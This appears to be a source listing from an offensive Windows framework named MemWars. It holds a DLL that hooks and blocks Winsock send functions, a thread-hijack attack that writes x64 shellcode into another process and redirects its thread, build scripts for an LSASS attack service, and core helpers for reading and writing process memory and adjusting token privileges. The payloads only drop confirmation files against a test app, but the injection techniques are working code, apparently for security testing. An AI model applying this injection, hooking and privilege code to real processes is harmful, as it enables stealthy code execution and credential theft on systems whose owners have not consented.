`AttackServices/LsassAttack/buildStealthyMemManipulatorTest.bat`:

```bat
@ECHO OFF
cl.exe /EHsc ServicesTest.cpp StealthyMemManipulatorInstaller.cpp StealthyMemManipulatorClient.cpp StealthyMemManipulatorGetHandleId.cpp ../../Core/MemWarsServicesCore.cpp ../../Core/MemWarsCore.c spinlock.obj /link User32.lib Kernel32.lib Advapi32.lib Ntdll.lib
```

`AttackServices/LsassAttack/buildTestPivotApp.bat`:

```bat
@ECHO OFF
cl.exe TestPivotApp.c ../../MemWarsCore/MemWarsCore.c /link user32.lib Kernel32.lib Advapi32.lib Ntdll.lib
```

`AttackServices/LsassAttack/spinlock.asm`:

```asm
.code
 
SpinLockByte proc
SpinLock:
	pause ; tells the CPU we're spinning
	cmp dl, [rcx]
	jnz SpinLock
	ret
SpinLockByte endp
 
end
```

`AttackServices/SocketHookAttack/SocketHookDLL.cpp`:

```cpp
#include <iostream>
#include <winsock2.h>
#include <windows.h>
#include "../../libs/PolyHook/PolyHook.hpp"

using namespace std;

void CreateConfirmationFile();
HANDLE hMutex;
shared_ptr<PLH::Detour> Detour_Send(new PLH::Detour);
shared_ptr<PLH::Detour> Detour_SendTo(new PLH::Detour);
shared_ptr<PLH::Detour> Detour_WSASend(new PLH::Detour);
shared_ptr<PLH::Detour> Detour_WSASendTo(new PLH::Detour);
shared_ptr<PLH::Detour> Detour_WSASendMsg(new PLH::Detour);

typedef int (__stdcall* tSend)(SOCKET s, const char *buf, int len, int flags);
tSend oSend = send;

typedef int (__stdcall* tSendto)(SOCKET s, const char *buf, int len, int flags, const sockaddr *to, int tolen);
tSendto oSendto = sendto;

typedef int (__stdcall* tWSASend)(
    SOCKET                             s,
    LPWSABUF                           lpBuffers,
    DWORD                              dwBufferCount,
    LPDWORD                            lpNumberOfBytesSent,
    DWORD                              dwFlags,
    LPWSAOVERLAPPED                    lpOverlapped,
    LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine
);
tWSASend oWSASend = WSASend;

typedef int (__stdcall* tWSASendTo)(
    SOCKET                             s,
    LPWSABUF                           lpBuffers,
    DWORD                              dwBufferCount,
    LPDWORD                            lpNumberOfBytesSent,
    DWORD                              dwFlags,
    const sockaddr                     *lpTo,
    int                                iTolen,
    LPWSAOVERLAPPED                    lpOverlapped,
    LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine
);
tWSASendTo oWSASendTo = WSASendTo;

typedef int (__stdcall* tWSASendMsg)(
    SOCKET                             Handle,
    LPWSAMSG                           lpMsg,
    DWORD                              dwFlags,
    LPDWORD                            lpNumberOfBytesSent,
    LPWSAOVERLAPPED                    lpOverlapped,
    LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine
);
tWSASendMsg oWSASendMsg = WSASendMsg;

int __stdcall hSend(SOCKET s, const char *buf, int len, int flags) {
    // MessageBoxA(NULL, "send called!\n", "MemWars Framework", MB_OK | MB_TOPMOST);
    CreateConfirmationFile();
    WSASetLastError(WSAEINPROGRESS);
    return SOCKET_ERROR;
    // return oSend(s, buf, len, flags);
}

int __stdcall hSendto(SOCKET s, const char *buf, int len, int flags, const sockaddr *to, int tolen) {
    // MessageBoxA(NULL, "sendto called!\n", "MemWars Framework", MB_OK | MB_TOPMOST);
    CreateConfirmationFile();
    WSASetLastError(WSAEINPROGRESS);
    return SOCKET_ERROR;
    // return oSendto(s, buf, len, flags, to, tolen);
}

int __stdcall hWSASend(SOCKET s, LPWSABUF lpBuffers, DWORD dwBufferCount, LPDWORD lpNumberOfBytesSent, DWORD dwFlags, LPWSAOVERLAPPED lpOverlapped, LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine) {
    // MessageBoxA(NULL, "WSASend called!\n", "MemWars Framework", MB_OK | MB_TOPMOST);
    CreateConfirmationFile();
    WSASetLastError(WSAEINPROGRESS);
    return SOCKET_ERROR;
    // return oWSASend(s, lpBuffers, dwBufferCount, lpNumberOfBytesSent, dwFlags, lpOverlapped, lpCompletionRoutine);
}

int __stdcall hWSASendTo(SOCKET s, LPWSABUF lpBuffers, DWORD dwBufferCount, LPDWORD lpNumberOfBytesSent, DWORD dwFlags, const sockaddr *lpTo, int iTolen, LPWSAOVERLAPPED lpOverlapped, LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine) {
    // MessageBoxA(NULL, "WSASendTo called!\n", "MemWars Framework", MB_OK | MB_TOPMOST);
    CreateConfirmationFile();
    WSASetLastError(WSAEINPROGRESS);
    return SOCKET_ERROR;
    // return oWSASendTo(s, lpBuffers, dwBufferCount, lpNumberOfBytesSent, dwFlags, lpTo, iTolen, lpOverlapped, lpCompletionRoutine);
}

int __stdcall hWSASendMsg(SOCKET Handle, LPWSAMSG lpMsg, DWORD dwFlags, LPDWORD lpNumberOfBytesSent, LPWSAOVERLAPPED lpOverlapped, LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine) {
    // MessageBoxA(NULL, "WSASendMsg called!\n", "MemWars Framework", MB_OK | MB_TOPMOST);
    CreateConfirmationFile();
    WSASetLastError(WSAEINPROGRESS);
    return SOCKET_ERROR;
    // return oWSASendMsg(Handle, lpMsg, dwFlags, lpNumberOfBytesSent, lpOverlapped, lpCompletionRoutine);
}

BOOL unhook = FALSE;
void CreateConfirmationFile() {
    TCHAR tempPath[MAX_PATH];
    GetTempPath(MAX_PATH, tempPath);
    lstrcatA(tempPath, "dllInjectionConfirmationFile");
    HANDLE h = CreateFileA(tempPath, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	CloseHandle(h);
    unhook = TRUE;
}

DWORD WINAPI InitializeHook(LPVOID lpParam) {

    Detour_Send->SetupHook((BYTE*)&send,(BYTE*) &hSend);
    Detour_Send->Hook();
    oSend = Detour_Send->GetOriginal<tSend>();

    Detour_SendTo->SetupHook((BYTE*)&sendto,(BYTE*) &hSendto);
    Detour_SendTo->Hook();
    oSendto = Detour_SendTo->GetOriginal<tSendto>();

    Detour_WSASend->SetupHook((BYTE*)&WSASend,(BYTE*) &hWSASend);
    Detour_WSASend->Hook();
    oWSASend = Detour_WSASend->GetOriginal<tWSASend>();

    Detour_WSASendTo->SetupHook((BYTE*)&WSASendTo,(BYTE*) &hWSASendTo);
    Detour_WSASendTo->Hook();
    oWSASendTo = Detour_WSASendTo->GetOriginal<tWSASendTo>();

    Detour_WSASendMsg->SetupHook((BYTE*)&WSASendMsg,(BYTE*) &hWSASendMsg);
    Detour_WSASendMsg->Hook();
    oWSASendMsg = Detour_WSASendMsg->GetOriginal<tWSASendMsg>();

    while (!unhook) {
        Sleep(1000); // wait for a socket function to be called
    }
    Sleep(1000);
    Detour_Send->UnHook();
    Detour_SendTo->UnHook();
    Detour_WSASend->UnHook();
    Detour_WSASendTo->UnHook();
    Detour_WSASendMsg->UnHook();
    FreeLibraryAndExitThread((HMODULE)lpParam, 0);

    return 1;
}

BOOL WINAPI DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpvReserved) {
    switch (dwReason) {
        case DLL_PROCESS_ATTACH:
            CreateThread(NULL, 0, &InitializeHook, hModule, 0, NULL); 
            break;
        }
    return TRUE;
}
```

`AttackServices/SocketHookAttack/SocketTestApp.cpp`:

```cpp
#include <winsock2.h>
#include <windows.h>

using namespace std;

int main() {

    while (true) {
        SOCKET s;
        send(s, NULL, 0, 0);
        sendto(s, NULL, 0, 0, NULL, 0);
        WSASend(s, NULL, 0, NULL, 0, NULL, NULL);
        WSASendTo(s, NULL, 0, NULL, 0, NULL, 0, NULL, NULL);
        WSASendMsg(s, NULL, 0, NULL, NULL, NULL);

        Sleep(1000);
    }
}
```

`AttackServices/SocketHookAttack/buildDLL.bat`:

```bat
@ECHO OFF
cl.exe /EHsc /LD SocketHookDLL.cpp /link /LTCG /LIBPATH:"C:\Users\marius\git\MemWars\libs\Capstone\msvc\x64\Release" user32.lib Ws2_32.lib
```

`AttackServices/SocketHookAttack/buildTestApp.bat`:

```bat
@ECHO OFF
cl.exe /EHsc SocketTestApp.cpp /link Ws2_32.lib
```

`AttackServices/ThreadHijackAttack/README.md`:

```md
# Thread hijack attack



This attack uses [VirtualAllocEx](https://msdn.microsoft.com/en-us/library/windows/desktop/aa366890%28v=vs.85%29.aspx?f=255&MSPPError=-2147217396) to reserve memory on an external process.



Then, the function [WriteProcessMemory](https://msdn.microsoft.com/de-de/library/windows/desktop/ms681674(v=vs.85).aspx) writes shellcode to that memory.


The main thread of the external process is then captured to execute the shellcode.



Finally, the original state of the thread is restored and executed further.
```

`AttackServices/ThreadHijackAttack/ThreadHijack.cpp`:

```cpp
#include <windows.h>
#include <iostream>
#include "ThreadHijack.h"

using namespace std;

int ThreadHijack(HANDLE process, DWORD threadID) {

	FARPROC addrCloseHandle = GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), "CloseHandle");
	FARPROC addrCreateFileA = GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), "CreateFileA");
    if (addrCreateFileA == NULL || addrCloseHandle == NULL) {
        cout << "GetProcAddress returned NULL" << endl;
        return 1;
	}
	void* remoteMemory = VirtualAllocEx(process, NULL, 4096, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (remoteMemory == NULL) {
		return 2;
	}
	

	BYTE codeCave[] = {
		0x48, 0x83, 0xE4, 0xF0,				// +0 and rsp, 0x0f (make sure stack 16-byte aligned)
		0x48, 0xB9, 0, 0, 0, 0, 0, 0, 0, 0, // +4 mov rcx (lpFileName)
        0x48, 0xBA, 0, 0, 0, 0, 0, 0, 0, 0, // +14 mov rdx (dwDesiredAccess)
        0x4D, 0x31, 0xC0,                   // +24 xor r8,r8 (dwShareMode)
		0x4D, 0x31, 0xC9,                   // +27 xor r9,r9 (lpSecurityAttributes)
		0x48, 0x83, 0xEC, 0x08,             // +30 sub rsp, 0x08 (We are pushing 3 Parameters = 24 byte. Stack must be 16 byte aligned, so we add 8 byte beforehand)
        0x68, 0x00, 0x00, 0x00, 0x00,       // +34 push 0x0 (hTemplateFile)
        0x68, 0x80, 0x00, 0x00, 0x00,       // +39 push 0x80 (dwFlagsAndAttributes)
        0x68, 0x02, 0x00, 0x00, 0x00,       // +44 push 0x2 (dwCreationDisposition)
		0x48, 0xB8, 0, 0, 0, 0, 0, 0, 0, 0, // +49 mov rax (CreateFileA Process Address)
		0x48, 0x83, 0xEC, 0x20,             // +59 sub rsp, 0x20 (save 32 byte for Windows parameters - must be always done)
		0xFF, 0xD0,                         // +63 call rax
		0x48, 0x83, 0xC4, 0x40,				// +65 add rsp, 0x40 (0x20 + 3 Parameters + 8 Byte alignment buf)
		0x48, 0x89, 0xC1,					// +69 mov rcx, rax (HANDLE of CreateFileA)
		0x48, 0xB8, 0, 0, 0, 0, 0, 0, 0, 0, // +72 mov rax (CloseHandle Process Address)
		0x48, 0x83, 0xEC, 0x20,				// sub rsp 0x20
		0xFF, 0xD0,							// call rax
		0x48, 0x83, 0xC4, 0x20,				// add rsp, 0x20
        0xEB, 0xFE                          // nop + jmp rel8 -2
	};
	
	*(DWORD64*)((PUCHAR)codeCave + 6) = (DWORD64)(ULONG_PTR)remoteMemory + sizeof(codeCave);
	*(DWORD64*)((PUCHAR)codeCave + 16) = GENERIC_READ | GENERIC_WRITE;
    *(DWORD64*)((PUCHAR)codeCave + 51) = (DWORD64)(ULONG_PTR)addrCreateFileA;
	*(DWORD64*)((PUCHAR)codeCave + 74) = (DWORD64)(ULONG_PTR)addrCloseHandle;
	
	// const TCHAR filename[] = "hijackConfirmationFile";
	TCHAR filename[MAX_PATH];
    GetTempPath(MAX_PATH, filename);
    lstrcatA(filename, "hijackConfirmationFile");

	WriteProcessMemory(process, remoteMemory, codeCave, sizeof(codeCave), NULL);
	WriteProcessMemory(process, (void*)((DWORD64)remoteMemory + sizeof(codeCave)), &filename, sizeof(filename), NULL);

	// suspend the thread and query its control context
	HANDLE thread = OpenThread((THREAD_GET_CONTEXT | THREAD_SUSPEND_RESUME | THREAD_SET_CONTEXT), false, threadID);
	if (thread == NULL) {
		return 3;
	}
	DWORD ret = SuspendThread(thread);
	if (ret == -1) {
		return 4;
	}

	CONTEXT tcInitial;
	CONTEXT tcHijack;
	CONTEXT tcCurrent;
	tcInitial.ContextFlags = CONTEXT_ALL;
	if (!GetThreadContext(thread, &tcInitial)) {
		return 5;
	}
	CopyMemory(&tcHijack, &tcInitial, sizeof(CONTEXT));
	CopyMemory(&tcCurrent, &tcInitial, sizeof(CONTEXT));

	//hijack the thread
	tcHijack.Rip = (DWORD64)remoteMemory;
	if (!SetThreadContext(thread, &tcHijack)) {
		return 6;
	}
	ret = ResumeThread(thread);
	if (ret == -1) {
		return 7;
	}

	//wait until the code cave did it's job
	DWORD64 addrEndOfExec = (DWORD64)remoteMemory + sizeof(codeCave) - 2;
	do {
		GetThreadContext(thread, &tcCurrent);
	} while (tcCurrent.Rip != addrEndOfExec);
	SuspendThread(thread);
	SetThreadContext(thread, &tcInitial);
	ResumeThread(thread);
	return 0;
}
```

`AttackServices/ThreadHijackAttack/ThreadHijack.h`:

```h
#pragma once

int ThreadHijack(HANDLE process, DWORD threadID);
```

`AttackServices/ThreadHijackAttack/ThreadHijackTest.cpp`:

```cpp
#include <iostream>
#include <vector>
#include <Shlwapi.h> // PathFileExists
#include "../../Core/MemWarsCore.h"
#include "../../Core/MemWarsServicesCore.h"
#include "ThreadHijack.h"

using namespace std;

void ThreadHijackTest() {
    
    system("start /B memoryTestApp.exe");
    HANDLE hProcess = NULL;
    while (hProcess == NULL) {
        hProcess = (HANDLE)GetProcessByName("memoryTestApp.exe");
    }

    vector<DWORD> pids = GetPIDsOfProcess(L"memoryTestApp.exe");
    if (pids.empty()) {
        cout << "ThreadHijackTest() failed. Pids not found" << endl;
        system("taskkill /IM memoryTestApp.exe /F >nul");
        return;
    }
    DWORD pid = pids[0];
    vector<DWORD> tids = GetTIDChronologically(pid);
    if (tids.empty()) {
        cout << "ThreadHijackTest() failed. Tids not found" << endl;
        system("taskkill /IM memoryTestApp.exe /F >nul");
        return;
    }
    DWORD tid = tids[0];
    
    int ret = ThreadHijack(hProcess, tid);
    if (ret != 0) {
        cout << "ThreadHijackTest() failed: " << ret << endl;
        goto Exit;
    }

    TCHAR filename[MAX_PATH];
    GetTempPath(MAX_PATH, filename);
    lstrcatA(filename, "hijackConfirmationFile");

    if (!PathFileExists(filename)) {
        cout << "ThreadHijackTest() failed" << endl;
        goto Exit;
    } else {
        cout << "ThreadHijackTest() success" << endl;
        system("taskkill /IM memoryTestApp.exe /F >nul");
        DeleteFile(filename);
        return;
    }
    
    Exit:
    system("taskkill /IM memoryTestApp.exe /F >nul");
}

int main() {
    ThreadHijackTest();
}
```

`AttackServices/ThreadHijackAttack/buildThreadHijackTest.bat`:

```bat
@ECHO OFF
cl.exe /EHsc ThreadHijackTest.cpp ThreadHijack.cpp ../../Core/MemWarsCore.c ../../Core/MemWarsServicesCore.cpp /link User32.lib Kernel32.lib Advapi32.lib Ntdll.lib Shlwapi.lib
```

`Core/MemWarsCore.c`:

```c
#include <stdio.h>
#include <windows.h>
#include <Psapi.h> // enumprocesses
#include <limits.h> // UINT_MAX
#include "MemWarsCore.h"


BOOL ValueIsMatching(BYTEARRAY* memPtr, BYTEARRAY* memPtr1) {
    if (memPtr->size != memPtr1->size) {
        printf("ValueIsMatching() failed. memPtr->size != memPtr1->size\n");
        return FALSE;
    }
    int status = memcmp(memPtr->values, memPtr1->values, memPtr->size);
    if (status == 0) {
        return TRUE;
    } else {
        return FALSE;
    }
}


void IntToByteArray(BYTEARRAY* bArr, int val) {
    bArr->size = sizeof(val);
    memcpy(bArr->values, &val, sizeof(val));
}

void UintToByteArray(BYTEARRAY* bArr, UINT val) {
    bArr->size = sizeof(val);
    memcpy(bArr->values, &val, sizeof(val));
}

void ByteToByteArray(BYTEARRAY* bArr, BYTE c) {
    bArr->size = sizeof(c);
    memcpy(bArr->values, &c, sizeof(c));
}


void ShortToByteArray(BYTEARRAY* bArr, SHORT s) {
    bArr->size = sizeof(s);
    memcpy(bArr->values, &s, sizeof(s));
}

void FloatToByteArray(BYTEARRAY* bArr, FLOAT f) {
    bArr->size = sizeof(f);
    memcpy(bArr->values, &f, sizeof(f));
}

void DoubleToByteArray(BYTEARRAY* bArr, DOUBLE d) {
    bArr->size = sizeof(d);
    memcpy(bArr->values, &d, sizeof(d));
}

BOOL StrToByteArray(BYTEARRAY* bArr, const TCHAR* str) {
    if (strlen(str) > MAX_VAL_SIZE) {
        printf("StrToByteArray()::String too long! Increase MAX_VAL_SIZE\n");
        return FALSE;
    }
    strcpy(bArr->values, str);
    bArr->size = strlen(str);
    return TRUE;
}

BOOL BytesToByteArray(BYTEARRAY* bArr, BYTE* c, SIZE_T byteLen) {
    if (byteLen > MAX_VAL_SIZE) {
        printf("StrToByteArray()::Bytearray too long! Increase MAX_VAL_SIZE\n");
        return FALSE;
    }
    bArr->size = byteLen;
    memcpy(bArr->values, c, byteLen);
    return TRUE;
}

BOOL ReallocMemPtrs(MEMPTRS* memPtrs) {
    if (memPtrs->size == 0) {
        memPtrs->memPointerArray = malloc(sizeof(void*) * 20);
    } else {
        memPtrs->memPointerArray = realloc(memPtrs->memPointerArray, memPtrs->size * sizeof(void*) + sizeof(void*) * 20);
    }
    if (memPtrs->memPointerArray == NULL) {
        return FALSE;
    } else {
        return TRUE;
    }
}

BOOL ConcatMemPtr(void* ptr, MEMPTRS* memPtrs) {
    if (memPtrs->size % 20 == 0) {
        BOOL success = ReallocMemPtrs(memPtrs);
        if (!success) {
            return FALSE;
        }
    }
    memPtrs->memPointerArray[memPtrs->size] = ptr;
    memPtrs->size++;
    return TRUE;
}

BOOL FindValueInProcess(BYTEARRAY* bArrValue, HANDLE hProcess, MEMPTRS* matchingMemPtrs) {
    BYTE* p = NULL;
    MEMORY_BASIC_INFORMATION info;
    
    for (p = NULL; VirtualQueryEx(hProcess, p, &info, sizeof(info)) != 0; p += info.RegionSize) {
        if (info.State == MEM_COMMIT/* && (info.Type == MEM_MAPPED || info.Type == MEM_PRIVATE || MEM_IMAGE)*/) {
            BYTE* buf = malloc(info.RegionSize);
            SIZE_T bytesRead;
            BOOL status = ReadProcessMemory(hProcess, p, buf, info.RegionSize, &bytesRead);
            if (!status) {
                if (GetLastError() != 299) {
                    printf("FindValueInProcess()::ReadProcessMemory() failed: %d\n", GetLastError());
                    return FALSE;
                }
            }
            for (int i = 0; i < bytesRead; i++) {
                if (i + bArrValue->size >= bytesRead) {
                    // end of memory reached
                    // printf("edge reached\n");
                    break;
                }
                BYTEARRAY memVal;
                memcpy(memVal.values, buf + i, bArrValue->size);
                memVal.size = bArrValue->size;
                if (ValueIsMatching(&memVal, bArrValue)) {
                    ConcatMemPtr((p + i), matchingMemPtrs);
                }
            }
            free(buf);
        }
    }
    return TRUE;
}


BOOL ReallocMemoryMap(MEMMAP* memMap) {
    if (memMap->size == 0) {
        memMap->byteArrays = malloc(sizeof(BYTEARRAY*) * 20);
        memMap->memPtrs = calloc(sizeof(MEMPTRS), 0);
        memMap->memPtrs->size = 0;
    } else {
        memMap->byteArrays = realloc(memMap->byteArrays, memMap->size * sizeof(BYTEARRAY*) + sizeof(BYTEARRAY*) * 20);
    }
    if (memMap->byteArrays == NULL || memMap->memPtrs == NULL || memMap->byteArrays == NULL) {
        return FALSE;
    }
    return TRUE;
}

BOOL ConcatMemoryMap(MEMMAP* memMap, void* memPtr, BYTEARRAY* bArrVal) {
    if (memMap->size % 20 == 0) {
        BOOL status = ReallocMemoryMap(memMap);
        if (!status) {
            return FALSE;
        }
    }
    memMap->byteArrays[memMap->size] = malloc(sizeof(BYTEARRAY));
    memcpy(memMap->byteArrays[memMap->size], bArrVal, sizeof(BYTEARRAY));
    BOOL status = ConcatMemPtr(memPtr, memMap->memPtrs);
    memMap->size++;
    if (!status) {
        return FALSE;
    }
    return TRUE;
}

void FreeMemMap(MEMMAP* memMap) {
    for (int i = 0; i < memMap->size; i++) {
        free(memMap->byteArrays[i]);
    }
    free(memMap->byteArrays);
    free(memMap->memPtrs->memPointerArray);
    free(memMap->memPtrs);
}


BOOL ReadProcessMemoryAtPtrLocation(void* ptr, SIZE_T byteLen, HANDLE process, BYTEARRAY* readValueByteArray) {
    if (byteLen > MAX_VAL_SIZE) {
        printf("ReadProcessMemoryAtPtrLocation() failed, byteLen too big, increase MAX_VAL_SIZE\n");
        return FALSE;
    }
    MEMORY_BASIC_INFORMATION info;
    BOOL status = VirtualQueryEx(process, ptr, &info, sizeof(info));
    if (status == 0 || info.RegionSize < byteLen || info.State != MEM_COMMIT) {
        printf("ReadProcessMemoryAtPtrLocation()::VirtualQueryEx() failed\n");
        return FALSE;
    }
    BYTE* buf = malloc(info.RegionSize);
    SIZE_T bytesRead;
    status = ReadProcessMemory(process, ptr, buf, byteLen, &bytesRead);
    if (!status) {
        if (GetLastError() != 299) {
            printf("ReadProcessMemoryAtPtrLocation()::ReadProcessMemory() failed: %d\n", GetLastError());
            return FALSE;
        }
    }
    if (bytesRead < byteLen) {
        return FALSE;
    }
    memcpy(readValueByteArray->values, buf, byteLen);
    readValueByteArray->size = byteLen;

    free(buf);
    return TRUE;
}

BOOL WriteProcessMemoryAtPtrLocation(HANDLE process, void* baseAdress, void* value, SIZE_T valSize) {
    SIZE_T bytesWritten = 0;
    BOOL status =  WriteProcessMemory(process, baseAdress, value, valSize, &bytesWritten);
    if (status == 0) {
        printf("writeMemoryAtPtrLocation()::WriteProcessMemory() failed! %d\n", GetLastError());
        return FALSE;
    }
    return TRUE;
}

HANDLE GetProcessByWindowName(const TCHAR* windowName) {
    HWND windowHwnd = FindWindow(0, windowName);
    if (windowHwnd == NULL) {
        printf("GetProcessByWindowName::FindWindow() returned NULL: %d\n", GetLastError());
        return NULL;
    }
    DWORD processId;
    DWORD thread = GetWindowThreadProcessId(windowHwnd, &processId);
    HANDLE process = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION | PROCESS_ALL_ACCESS, FALSE, processId);
    if (process == NULL) {
        printf("GetProcessByWindowName::OpenProcess() returned NULL: %d\n", GetLastError());
    }
    return process;
}

HANDLE GetProcessByName(const TCHAR* szProcessName) {
    if(szProcessName == NULL) return NULL;
    const TCHAR* strProcessName = szProcessName;

    DWORD aProcesses[1024], cbNeeded, cProcesses;
    if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded)) {
        return NULL;
    }
    cProcesses = cbNeeded / sizeof(DWORD);
    for (UINT i = 0; i < cProcesses; i++) {
        DWORD dwProcessID = aProcesses[i];
        HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_ALL_ACCESS, FALSE, dwProcessID);

        TCHAR szEachProcessName[MAX_PATH];
        if (hProcess != NULL) {
            HMODULE hMod;
            DWORD cbNeeded;
            if (EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded)) {
                GetModuleBaseName(hProcess, hMod, szEachProcessName, sizeof(szEachProcessName) / sizeof(TCHAR));
            }
        }
        if (strcmp(strProcessName, szEachProcessName) == 0) {
            return hProcess;
        }
        CloseHandle(hProcess);
    }
    return NULL;
}


void* GetProcessBaseAddress(const HANDLE hProcess) {
	if (hProcess == NULL) {
        return NULL;
    }
	HMODULE lphModule[1024];
	DWORD lpcbNeeded;
	if (!EnumProcessModules(hProcess, lphModule, sizeof(lphModule), &lpcbNeeded)) {
        return NULL;
    }
	return lphModule[0]; // Module 0 is the EXE itself, returning its address
}

BOOL MemorySnapshotToDisc(HANDLE hProcess, const TCHAR* fileName) {
    TCHAR* memPtrsFileName;
    memPtrsFileName = malloc(strlen(fileName) + strlen(" - ptrs"));
    strcpy(memPtrsFileName, fileName);
    strcat(memPtrsFileName, " - ptrs");
    FILE* dataFile = fopen(fileName, "wb");
    FILE* memPtrFile = fopen(memPtrsFileName, "wb");
    if (dataFile == NULL) {
        printf("Could not open file %s\n", fileName);
        return FALSE;
    }
    BYTE* p = NULL;
    MEMORY_BASIC_INFORMATION info;
    for (p = NULL; VirtualQueryEx(hProcess, p, &info, sizeof(info)) != 0; p += info.RegionSize) {
        if (info.State == MEM_COMMIT) {
            BYTE* buf = malloc(info.RegionSize);
            SIZE_T bytesRead;
            BOOL status = ReadProcessMemory(hProcess, p, buf, info.RegionSize, &bytesRead);
            if (!status) {
                if (GetLastError() != 299) {
                    printf("FindValueInProcess()::ReadProcessMemory() failed: %d\n", GetLastError());
                    return FAST_FAIL_LEGACY_GS_VIOLATION;
                }
            }
            for (int i = 0; i < bytesRead; i++) {
                void* ptrBuf = (p + i);
                fwrite(&ptrBuf, sizeof(void*), 1, memPtrFile);
            }
            fwrite(buf, sizeof(BYTE), bytesRead, dataFile);
            free(buf);
        }
    }
    fclose(dataFile);
    fclose(memPtrFile);
    free(memPtrsFileName);

    return TRUE;
}

BOOL SetProcessPrivilege(LPCSTR lpszPrivilege, BOOL bEnablePrivilege) {
    TOKEN_PRIVILEGES priv = {0, 0, 0, 0};
    HANDLE hToken = NULL;
    LUID luid = {0, 0};
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) {
        if (hToken) {
            CloseHandle(hToken);
        }
        return FALSE;
    }
    if (!LookupPrivilegeValueA(0, lpszPrivilege, &luid)) {
        if (hToken){
            CloseHandle(hToken);
        }
        return FALSE;
    }
    priv.PrivilegeCount = 1;
    priv.Privileges[0].Luid = luid;
    priv.Privileges[0].Attributes = bEnablePrivilege ? SE_PRIVILEGE_ENABLED : SE_PRIVILEGE_REMOVED;
    if (!AdjustTokenPrivileges(hToken, FALSE, &priv, 0, 0, 0)) {
        if (hToken) {
            CloseHandle(hToken);
        }
        return FALSE;
    }
    if (hToken) {
        CloseHandle(hToken);
    }
    return TRUE;
}

```

`Core/MemWarsCore.h`:

```h

#ifndef _MEM_ANALYZER_H
#define _MEM_ANALYZER_H

#include <windows.h>

#ifdef __cplusplus
extern "C" {
#endif

#define MAX_VAL_SIZE 200

typedef struct _BYTE_ARRAY {
    BYTE values[MAX_VAL_SIZE];
    SIZE_T size;
} BYTEARRAY;

typedef struct _MEM_PTRS {
    void** memPointerArray;
    SIZE_T size;
} MEMPTRS;

typedef struct _MEMORY_MAP {
    MEMPTRS* memPtrs;
    BYTEARRAY** byteArrays;
    SIZE_T size;
} MEMMAP;


BOOL ValueIsMatching(BYTEARRAY*, BYTEARRAY*);
void IntToByteArray(BYTEARRAY*, INT);
void UintToByteArray(BYTEARRAY*, UINT);
void FloatToByteArray(BYTEARRAY*, FLOAT);
void DoubleToByteArray(BYTEARRAY*, DOUBLE);
void ShortToByteArray(BYTEARRAY*, SHORT);
void ByteToByteArray(BYTEARRAY*, BYTE);
BOOL StrToByteArray(BYTEARRAY*, const TCHAR*);
BOOL BytesToByteArray(BYTEARRAY* bArr, BYTE* c, SIZE_T byteLen);
BOOL ReallocMemPtrs(MEMPTRS*);
BOOL ConcatMemPtr(void*, MEMPTRS*);
BOOL FindValueInProcess(BYTEARRAY*, HANDLE, MEMPTRS*);
BOOL ReadProcessMemoryAtPtrLocation(void*, SIZE_T, HANDLE, BYTEARRAY*);
BOOL WriteProcessMemoryAtPtrLocation(HANDLE, void* baseAddr, void* valPtr, SIZE_T valSize);
HANDLE GetProcessByWindowName(const TCHAR*);
HANDLE GetProcessByName(const TCHAR*);
void* GetProcessBaseAddress(HANDLE);
BOOL SetProcessPrivilege(LPCSTR, BOOL);
BOOL ReallocMemoryMap(MEMMAP*);
BOOL ConcatMemoryMap(MEMMAP*, void*, BYTEARRAY*);
BOOL MemorySnapshotToDisc(HANDLE, const TCHAR*);
void FreeMemMap(MEMMAP*);

#ifdef __cplusplus
}
#endif

#endif
```

`Core/MemWarsCoreTest.c`:

```c
#include <stdio.h>
#include <windows.h>
#include "MemWarsCore.h"

void FindValueInProcessTest() {
    system("start /B memoryTestApp.exe");
    HANDLE process = NULL;
    while (process == NULL) {
        process = (HANDLE)GetProcessByName("memoryTestApp.exe");
    }
    BYTEARRAY testValue1;
    BYTEARRAY testValue2;
    BYTEARRAY testValue3;
    BYTEARRAY testValue4;
    BYTEARRAY testValue5;
    BYTEARRAY testValue6;
    BYTEARRAY testValue7;
    BYTEARRAY testValue8;
    IntToByteArray(&testValue1, 133337);
    IntToByteArray(&testValue2, 0xB00B);
    IntToByteArray(&testValue3, 0xCFFE);
    StrToByteArray(&testValue4, "smallStr");
    StrToByteArray(&testValue5, "Can you find me too?");
    StrToByteArray(&testValue6, "And me??");
    FloatToByteArray(&testValue7, 1.375);
    DoubleToByteArray(&testValue8, 312.76493);

    MEMPTRS matchingMemPtrs = {0};
    int lastSize = matchingMemPtrs.size;
    FindValueInProcess(&testValue1, process, &matchingMemPtrs);
    if (lastSize >= matchingMemPtrs.size) {
        printf("FindValueInProcessTest() failed\n");
        goto Exit;
    }
    lastSize = matchingMemPtrs.size;
    FindValueInProcess(&testValue2, process, &matchingMemPtrs);
    if (lastSize >= matchingMemPtrs.size) {
        printf("FindValueInProcessTest() failed\n");
        goto Exit;
    }
    lastSize = matchingMemPtrs.size;
    FindValueInProcess(&testValue3, process, &matchingMemPtrs);
    if (lastSize >= matchingMemPtrs.size) {
        printf("FindValueInProcessTest() failed\n");
        goto Exit;
    }
    lastSize = matchingMemPtrs.size;
    FindValueInProcess(&testValue4, process, &matchingMemPtrs);
    if (lastSize >= matchingMemPtrs.size) {
        printf("FindValueInProcessTest() failed\n");
        goto Exit;
    }
    lastSize = matchingMemPtrs.size;
    FindValueInProcess(&testValue5, process, &matchingMemPtrs);
    if (lastSize >= matchingMemPtrs.size) {
